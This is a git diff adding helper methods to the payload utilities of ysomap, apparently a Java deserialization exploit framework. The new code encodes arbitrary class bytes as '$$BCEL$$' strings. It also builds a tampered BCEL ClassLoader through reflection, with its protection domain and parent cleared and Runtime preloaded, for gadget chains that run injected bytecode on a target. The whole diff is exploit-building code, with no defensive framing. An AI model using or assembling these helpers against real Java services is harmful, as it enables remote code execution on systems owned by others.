@@ -1,16 +1,15 @@
 package ysomap.core.util;
 
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 import ysomap.common.exception.GenerateErrorException;
 import ysomap.core.ObjectGadget;
 
+import java.io.IOException;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.TreeMap;
-import java.util.TreeSet;
+import java.util.*;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
@@ -102,5 +101,27 @@ public class PayloadHelper {
         } catch (Exception e) {
             throw new GenerateErrorException(type, clazz.getSimpleName());
         }
+    }
+
+    public static String makeBCELStr(byte[] classbytes) throws IOException {
+        return "$$BCEL$$" + Utility.encode(classbytes, true);
+    }
+
+    public static Object makeBCELClassLoader() throws Exception {
+        Class<?> clazz = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+        Object classLoader = clazz.newInstance();
+        ReflectionHelper.setFieldValue(classLoader, "ignored_packages", new String[]{});
+        Object defaultDomain = ReflectionHelper.getFieldValue(classLoader, "defaultDomain");
+        ReflectionHelper.setFieldValue(defaultDomain, "codesource", null);
+        ReflectionHelper.setFieldValue(defaultDomain, "classloader", null);
+        ReflectionHelper.setFieldValue(classLoader, "defaultDomain", defaultDomain);
+        ReflectionHelper.setFieldValue(classLoader, "assertionLock", null);
+        ReflectionHelper.setFieldValue(classLoader, "parent", null);
+        ReflectionHelper.setFieldValue(classLoader, "deferTo", null);
+
+        Hashtable classes = (Hashtable) ReflectionHelper.getFieldValue(classLoader, "classes");
+        classes.put("java.lang.Object", Object.class);
+        classes.put("java.lang.Runtime", Runtime.class);
+        return classLoader;
     }
 }
